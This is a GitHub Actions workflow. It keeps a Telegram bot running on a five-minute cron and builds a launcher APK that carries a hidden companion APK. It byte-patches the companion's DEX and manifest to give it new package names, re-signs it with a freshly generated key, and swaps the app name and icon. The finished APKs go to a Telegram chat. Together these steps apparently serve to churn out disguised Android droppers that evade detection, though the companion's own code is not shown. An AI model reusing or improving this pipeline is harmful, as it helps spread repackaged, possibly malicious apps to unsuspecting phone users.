# ════════════════════════════════════════════════════════
# UNIFIED BUILD WORKFLOW
# Nova package:      com.mobile.tools.XXXXXXXXXXXXXXXXXXX (36 chars)
# Companion package: com.phone.helpXXXXX (19 chars)
# ════════════════════════════════════════════════════════

name: Builder

on:
  push:
    branches: [ main ]
  schedule:
    - cron: '*/5 * * * *'
  workflow_dispatch:
    inputs:
      build_type:
        description: 'bot | both'
        required: true
        default: 'bot'
      nova_package:
        description: 'Nova package name (exactly 36 chars)'
        required: false
        default: ''
      companion_package:
        description: 'Companion package name (exactly 19 chars)'
        required: false
        default: ''
      chain_part1:
        description: 'Chain Part 1 (10 random chars)'
        required: false
        default: ''
      app_name:
        description: 'App name for Nova Launcher'
        required: false
        default: ''
      icon_b64:
        description: 'Base64 encoded PNG icon'
        required: false
        default: ''

jobs:

# ════════════════════════════════════════════════════════
# JOB 0 — PUSH NOTIFICATION
# ════════════════════════════════════════════════════════

  notify_push:
    name: Push Notification
    runs-on: ubuntu-latest
    if: github.event_name == 'push'
    steps:
      - name: Send push notification to Telegram
        run: |
          COMMIT_ID="${{ github.sha }}"
          SHORT_ID="${COMMIT_ID:0:7}"
          COMMIT_MSG="${{ github.event.head_commit.message }}"
          PUSHER="${{ github.event.pusher.name }}"
          BRANCH="${{ github.ref_name }}"
          TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M UTC')
          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -d parse_mode="Markdown" \
            -d text="📦 *New Push to GitHub*

          🔀 Branch : \`$BRANCH\`
          🔑 Commit : \`$SHORT_ID\`
          💬 Message: $COMMIT_MSG
          👤 Pusher : $PUSHER
          📅 Time   : $TIMESTAMP

          🔗 [View commit](https://github.com/${{ github.repository }}/commit/$COMMIT_ID)"

# ════════════════════════════════════════════════════════
# JOB 1 — TELEGRAM BOT (24/7)
# ════════════════════════════════════════════════════════

  bot:
    name: Telegram Bot
    runs-on: ubuntu-latest
    if: >
      github.event_name == 'push' ||
      github.event_name == 'schedule' ||
      (github.event_name == 'workflow_dispatch' &&
       github.event.inputs.build_type == 'bot')
    timeout-minutes: 5
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Cache pip packages
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: pip-telebot-${{ runner.os }}

      - name: Install dependencies
        run: pip install pytelegrambotapi requests

      - name: Run Telegram Bot (4 min window)
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID:   ${{ secrets.TELEGRAM_CHAT_ID }}
          GH_PAT:             ${{ secrets.GH_PAT }}
          REPO_NAME:          ${{ github.repository }}
          GITHUB_EVENT_NAME:  ${{ github.event_name }}
        run: timeout 240 python3 telegram_bot.py || true

# ════════════════════════════════════════════════════════
# JOB 2 — BUILD BOTH APPS
# ════════════════════════════════════════════════════════

  build_both:
    name: Build Both Apps
    runs-on: ubuntu-latest
    if: >
      github.event_name == 'workflow_dispatch' &&
      github.event.inputs.build_type == 'both'
    timeout-minutes: 45

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Validate package name lengths
        run: |
          NOVA_PKG="${{ github.event.inputs.nova_package }}"
          COMP_PKG="${{ github.event.inputs.companion_package }}"
          NOVA_LEN=${#NOVA_PKG}
          COMP_LEN=${#COMP_PKG}
          echo "Nova package     : $NOVA_PKG ($NOVA_LEN chars)"
          echo "Companion package: $COMP_PKG ($COMP_LEN chars)"
          if [ "$NOVA_LEN" != "36" ]; then
            echo "[X] Nova package must be exactly 36 chars (got $NOVA_LEN)"
            exit 1
          fi
          if [ "$COMP_LEN" != "19" ]; then
            echo "[X] Companion package must be exactly 19 chars (got $COMP_LEN)"
            exit 1
          fi
          echo "[OK] Package lengths validated"

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Cache imagemagick
        uses: actions/cache@v4
        id: cache-apt
        with:
          path: /var/cache/apt/archives
          key: apt-imagemagick-${{ runner.os }}

      - name: Install imagemagick
        run: |
          sudo apt-get install -y imagemagick -q
          echo "[OK] imagemagick ready"

      - name: Cache Gradle wrapper jar
        uses: actions/cache@v4
        with:
          path: gradle/wrapper/gradle-wrapper.jar
          key: gradle-wrapper-${{ runner.os }}

      # ── STAGE 1: Patch Companion APK ────────────────────────
      # KEY FIX: We do NOT use apktool to recompile resources
      # because companion has obfuscated res/type1/ paths that break apktool
      # Instead: binary-patch DEX + binary-patch manifest directly in ZIP
      - name: Patch and repackage companion APK
        run: |
          python3 << 'PYEOF'
          import zipfile, os

          nova_pkg = os.environ.get('NOVA_PKG', '')
          comp_pkg = os.environ.get('COMP_PKG', '')

          old_nova_uri  = b'package:com.cristal.bristral.tristal.mistral'
          old_nova      = b'com.cristal.bristral.tristal.mistral'
          old_comp      = b'com.android.pictach'
          old_comp_path = b'com/android/pictach'

          new_nova_uri  = b'package:' + nova_pkg.encode()
          new_nova      = nova_pkg.encode()
          new_comp      = comp_pkg.encode()
          new_comp_path = comp_pkg.replace('.', '/').encode()

          # Validate lengths — critical for binary patch
          assert len(old_nova_uri)  == len(new_nova_uri),  "Nova URI length mismatch!"
          assert len(old_nova)      == len(new_nova),      "Nova pkg length mismatch!"
          assert len(old_comp)      == len(new_comp),      "Companion pkg length mismatch!"
          assert len(old_comp_path) == len(new_comp_path), "Companion path length mismatch!"

          print(f"Patching companion APK...")
          print(f"  Nova target  : {old_nova.decode()} → {nova_pkg}")
          print(f"  Companion pkg: {old_comp.decode()} → {comp_pkg}")

          original = 'app/src/main/assets/companion.apk'

          with zipfile.ZipFile(original, 'r') as zin:
              with zipfile.ZipFile('companion_unsigned.apk', 'w') as zout:
                  for item in zin.infolist():
                      data = zin.read(item.filename)

                      if item.filename == 'classes.dex':
                          # Patch DEX binary
                          count_nova_uri = data.count(old_nova_uri)
                          count_comp     = data.count(old_comp)
                          data = data.replace(old_nova_uri,  new_nova_uri)
                          data = data.replace(old_nova,      new_nova)
                          data = data.replace(old_comp_path, new_comp_path)
                          data = data.replace(old_comp,      new_comp)
                          print(f"  DEX: {count_nova_uri} Nova URI, {count_comp} companion refs patched")

                      elif item.filename == 'AndroidManifest.xml':
                          # Patch binary manifest
                          data = data.replace(old_comp_path, new_comp_path)
                          data = data.replace(old_comp,      new_comp)
                          print(f"  Manifest: patched")

                      # Write with same compression type as original
                      zout.writestr(item, data)

          import subprocess
          r = subprocess.run(['du','-h','companion_unsigned.apk'],
                             capture_output=True, text=True)
          print(f"[OK] companion_unsigned.apk: {r.stdout.strip()}")
          PYEOF
        env:
          NOVA_PKG: ${{ github.event.inputs.nova_package }}
          COMP_PKG: ${{ github.event.inputs.companion_package }}

      - name: Verify DEX patch
        run: |
          python3 << 'PYEOF'
          import zipfile, os

          nova_pkg = os.environ.get('NOVA_PKG', '')
          comp_pkg = os.environ.get('COMP_PKG', '')

          with zipfile.ZipFile('companion_unsigned.apk', 'r') as z:
              dex = z.read('classes.dex')

          old_nova_uri = b'package:com.cristal.bristral.tristal.mistral'
          old_comp     = b'com.android.pictach'
          new_nova_uri = ('package:' + nova_pkg).encode()
          new_comp     = comp_pkg.encode()

          assert old_nova_uri not in dex, "[X] Old Nova URI still in DEX!"
          assert old_comp     not in dex, "[X] Old companion pkg still in DEX!"
          assert new_nova_uri in dex,     "[X] New Nova URI NOT in DEX!"
          assert new_comp     in dex,     "[X] New companion pkg NOT in DEX!"

          print("[OK] DEX patch verified!")
          print(f"  Nova target  : {nova_pkg}")
          print(f"  Companion pkg: {comp_pkg}")
          PYEOF
        env:
          NOVA_PKG: ${{ github.event.inputs.nova_package }}
          COMP_PKG: ${{ github.event.inputs.companion_package }}

      - name: Generate fresh keystore for companion
        run: |
          keytool -genkeypair \
            -alias companion_key \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -keystore companion.jks \
            -storepass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
            -keypass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
            -dname "CN=Android, OU=App, O=Mobile, L=US, S=CA, C=US" \
            -noprompt
          echo "[OK] Keystore generated"

      - name: Zipalign + Sign companion APK
        run: |
          BUILD_TOOLS=$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)
          $ANDROID_HOME/build-tools/$BUILD_TOOLS/zipalign -v 4 \
            companion_unsigned.apk companion_aligned.apk
          $ANDROID_HOME/build-tools/$BUILD_TOOLS/apksigner sign \
            --ks companion.jks \
            --ks-key-alias companion_key \
            --ks-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
            --key-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
            --out companion_signed.apk \
            companion_aligned.apk
          echo "[OK] Companion signed — $(du -h companion_signed.apk | cut -f1)"

      # ── STAGE 2: Patch Nova Launcher ────────────────────────
      - name: Place patched companion into Nova assets
        run: |
          cp companion_signed.apk app/src/main/assets/companion.apk
          echo "[OK] companion.apk replaced — $(du -h app/src/main/assets/companion.apk | cut -f1)"

      - name: Patch Nova applicationId + COMPANION_PACKAGE
        run: |
          NOVA_PKG="${{ github.event.inputs.nova_package }}"
          COMP_PKG="${{ github.event.inputs.companion_package }}"
          sed -i "s|applicationId \"[^\"]*\"|applicationId \"$NOVA_PKG\"|" app/build.gradle
          sed -i "s|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"[^\"]*\"|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"\\\"$COMP_PKG\\\"\"|" app/build.gradle
          echo "[OK] build.gradle patched"
          grep -E "applicationId|COMPANION_PACKAGE" app/build.gradle

      - name: Patch app name in strings.xml
        run: |
          APP_NAME="${{ github.event.inputs.app_name }}"
          if [ -n "$APP_NAME" ]; then
            python3 -c "
          import re, sys
          content = open('app/src/main/res/values/strings.xml').read()
          content = re.sub(
              r'<string name=\"app_name\">[^<]*</string>',
              '<string name=\"app_name\">' + sys.argv[1] + '</string>',
              content
          )
          open('app/src/main/res/values/strings.xml', 'w').write(content)
          print('[OK] App name: ' + sys.argv[1])
            " "$APP_NAME"
          fi

      - name: Patch chain_part1 in AndroidManifest.xml
        run: |
          CHAIN="${{ github.event.inputs.chain_part1 }}"
          if [ -n "$CHAIN" ]; then
            sed -i "s|android:value=\"PLACEHOLDER\"|android:value=\"$CHAIN\"|" \
              app/src/main/AndroidManifest.xml
            echo "[OK] chain_part1: $CHAIN"
          fi

      - name: Apply launcher icon
        run: |
          ICON_B64="${{ github.event.inputs.icon_b64 }}"
          if [ -n "$ICON_B64" ]; then
            echo "$ICON_B64" | base64 -d > /tmp/icon_input.png
            for size_dir in mdpi:48 hdpi:72 xhdpi:96 xxhdpi:144 xxxhdpi:192; do
              DIR=$(echo $size_dir | cut -d: -f1)
              SIZE=$(echo $size_dir | cut -d: -f2)
              convert /tmp/icon_input.png -resize ${SIZE}x${SIZE} \
                app/src/main/res/mipmap-${DIR}/ic_launcher.png
              convert /tmp/icon_input.png -resize ${SIZE}x${SIZE} \
                app/src/main/res/mipmap-${DIR}/ic_launcher_round.png
            done
            echo "[OK] All icon sizes replaced"
          fi

      # ── STAGE 3: Build Nova APK ──────────────────────────────
      - name: Grant gradlew permission
        run: chmod +x gradlew

      - name: Build Nova Release APK
        run: ./gradlew assembleRelease --no-daemon --stacktrace 2>&1 | tee build_output.log
        continue-on-error: true

      - name: Check build result
        run: |
          if grep -q "BUILD SUCCESSFUL" build_output.log; then
            echo "BUILD_STATUS=success" >> $GITHUB_ENV
            echo "[OK] Build successful"
          else
            echo "BUILD_STATUS=failed" >> $GITHUB_ENV
            echo "[X] Build failed"
            # Send error log to Telegram
            # Extract key error lines
            ERROR_LINES=$(grep -E "error:|Error:|FAILED|Exception|Caused by:" build_output.log | head -30)
            curl -s -X POST               "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage"               -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}"               -d parse_mode="Markdown"               -d text="❌ *Build Failed!*

          \`\`\`
          ${ERROR_LINES}
          \`\`\`"
            # Also upload full log as artifact
            exit 1
          fi

      - name: Upload build log on failure
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: build-error-log-${{ github.run_number }}
          path: build_output.log
          retention-days: 7

      - name: Verify Nova APK
        run: |
          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          echo "[OK] Nova APK: $(du -h $APK | cut -f1)"
          unzip -l "$APK" | grep -E "\.dex|companion"

      # ── STAGE 4: Send to Telegram ────────────────────────────
      - name: Send Companion APK to Telegram
        run: |
          curl -s -X POST \
            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -F document=@companion_signed.apk \
            -F caption="🔧 *Companion App*
          📦 Package: \`${{ github.event.inputs.companion_package }}\`
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')" \
            -F parse_mode="Markdown"

      - name: Send Nova APK to Telegram
        run: |
          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          curl -s -X POST \
            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -F document=@"$APK" \
            -F caption="✅ *Nova Launcher Built*
          📱 App Name : \`${{ github.event.inputs.app_name }}\`
          📦 Nova Pkg : \`${{ github.event.inputs.nova_package }}\`
          📦 Comp Pkg : \`${{ github.event.inputs.companion_package }}\`
          🔐 Chain    : \`${{ github.event.inputs.chain_part1 }}\`
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')" \
            -F parse_mode="Markdown"

      - name: Send build complete summary
        run: |
          curl -s -X POST \
            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -d parse_mode="Markdown" \
            -d text="✅ *Build Complete*

          📱 Name : ${{ github.event.inputs.app_name }}
          📦 Nova : \`${{ github.event.inputs.nova_package }}\`
          📦 Comp : \`${{ github.event.inputs.companion_package }}\`
          🔐 Chain: \`${{ github.event.inputs.chain_part1 }}\`
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')"

      # ── Error log — uploads on ANY failure ───────────────────
      - name: Collect full error log on failure
        if: failure()
        run: |
          LOG_FILE="error_log_run${{ github.run_number }}.txt"
          echo "========================================" >> $LOG_FILE
          echo "BUILD ERROR LOG" >> $LOG_FILE
          echo "Run     : #${{ github.run_number }}" >> $LOG_FILE
          echo "Time    : $(date -u)" >> $LOG_FILE
          echo "Nova    : ${{ github.event.inputs.nova_package }}" >> $LOG_FILE
          echo "Comp    : ${{ github.event.inputs.companion_package }}" >> $LOG_FILE
          echo "========================================" >> $LOG_FILE
          # Append gradle log if it exists
          if [ -f build_output.log ]; then
            echo "" >> $LOG_FILE
            echo "--- GRADLE BUILD LOG ---" >> $LOG_FILE
            cat build_output.log >> $LOG_FILE
          fi
          echo "[OK] Error log: $LOG_FILE ($(wc -l < $LOG_FILE) lines)"

      - name: Upload error log artifact
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: error-log-run${{ github.run_number }}
          path: error_log_run${{ github.run_number }}.txt
          retention-days: 30

      - name: Send error notification to Telegram
        if: failure()
        run: |
          LOG_FILE="error_log_run${{ github.run_number }}.txt"
          RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"

          # Get last 20 error lines for quick view
          if [ -f build_output.log ]; then
            ERROR_SUMMARY=$(grep -E "error:|Error:|FAILED|Exception|Caused by:|> Task"               build_output.log | tail -20 | head -c 3000)
          else
            ERROR_SUMMARY="No gradle log available. Check GitHub Actions log."
          fi

          curl -s -X POST             "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage"             -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}"             -d parse_mode="Markdown"             -d text="❌ *Build Failed — Run #${{ github.run_number }}*

          📦 Nova : \`${{ github.event.inputs.nova_package }}\`
          📦 Comp : \`${{ github.event.inputs.companion_package }}\`
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')

          🔗 [View full log on GitHub]($RUN_URL)
          _(Download error log artifact from Actions page)_"

          # Also send log file directly to Telegram if small enough
          if [ -f "$LOG_FILE" ] && [ $(wc -c < "$LOG_FILE") -lt 50000000 ]; then
            curl -s -X POST               "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument"               -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}"               -F document=@"$LOG_FILE"               -F caption="📋 Full error log — Run #${{ github.run_number }}"
          fi
